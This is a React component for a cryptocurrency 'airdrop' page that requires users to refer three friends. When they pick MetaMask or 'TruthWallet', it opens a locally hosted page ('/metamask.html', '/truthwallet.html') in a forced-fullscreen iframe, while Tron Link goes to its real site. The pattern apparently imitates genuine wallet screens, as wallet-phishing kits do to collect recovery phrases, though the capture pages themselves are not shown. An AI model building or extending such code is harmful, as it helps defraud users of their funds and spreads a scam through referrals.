import React, { useState, useRef } from 'react';
import './Airdrop.css';

const Airdrop: React.FC = () => {
  const [showMetamaskPage, setShowMetamaskPage] = useState(false);
  const [showTruthWalletPage, setShowTruthWalletPage] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement | null>(null);

  const friendsCount = 3; // Replace with dynamic count from user data
  const userCoins = 100000; // Replace with dynamic coin count from user data

  const handleAirdropClick = (link: string) => {
    window.location.href = link; // Navigate to the respective wallet page
  };

  const handleMetamaskClick = () => {
    setShowMetamaskPage(true);
    setShowTruthWalletPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const handleTruthWalletClick = () => {
    setShowTruthWalletPage(true);
    setShowMetamaskPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const enterFullscreen = (element: HTMLElement) => {
    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if ((element as any).mozRequestFullScreen) { // Firefox
      (element as any).mozRequestFullScreen();
    } else if ((element as any).webkitRequestFullscreen) { // Chrome, Safari, and Opera
      (element as any).webkitRequestFullscreen();
    } else if ((element as any).msRequestFullscreen) { // IE/Edge
      (element as any).msRequestFullscreen();
    }
  };
  

  return (
    <div className="airdrop-container">
      {friendsCount >= 3 && userCoins >= 100000 ? (
        <div>
          <h2 className="airdrop-title">Airdrop Available!</h2>
          <button className="airdrop-button" onClick={handleMetamaskClick}>
            Airdrop Now
          </button>
          <div className="wallet-options">
            <h3>Select Your Wallet:</h3>
            <div className="wallet-option" onClick={handleMetamaskClick}>
              <img src="/path/to/metamaskIcon.png" alt="MetaMask" />
              <p>MetaMask</p>
            </div>
            <div className="wallet-option" onClick={handleTruthWalletClick}>
              <img src="/path/to/heritageVoltIcon.png" alt="TruthWallet" />
              <p>TruthWallet</p>
            </div>
            <div className="wallet-option" onClick={() => handleAirdropClick('https://tronlink.org')}>
              <img src="/path/to/tronLinkIcon.png" alt="Tron Link" />
              <p>Tron Link</p>
            </div>
          </div>
        </div>
      ) : (
        <p className="airdrop-message">
          You must refer 3 friends to the app and collect 100,000 coins to be eligible for the airdrop.
        </p>
      )}

{showMetamaskPage && (
  <iframe ref={iframeRef} src="/metamask.html" className="metamask-frame" title="MetaMask Page"></iframe>
)}

{showTruthWalletPage && (
  <iframe ref={iframeRef} src="/truthwallet.html" className="truthwallet-frame" title="TruthWallet Page"></iframe>
)}
    </div>
  );
};

export default Airdrop;
